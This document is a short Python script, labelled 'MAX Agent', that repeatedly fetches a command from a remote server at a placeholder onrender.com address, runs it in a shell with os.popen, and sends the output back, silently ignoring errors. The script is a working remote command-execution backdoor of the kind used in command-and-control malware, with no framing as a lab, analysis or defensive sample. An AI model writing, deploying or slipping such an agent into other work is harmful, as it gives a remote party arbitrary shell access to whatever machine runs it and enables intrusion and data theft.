import requests
import time
import os

SERVER = "https://your-app.onrender.com"

print("MAX Agent Running...")

while True:
    try:
        res = requests.get(SERVER + "/get").json()
        cmd = res["command"]

        if cmd:
            print("Executing:", cmd)
            output = os.popen(cmd).read()

            requests.post(SERVER + "/result", json={
                "output": output
            })

    except:
        pass

    time.sleep(2)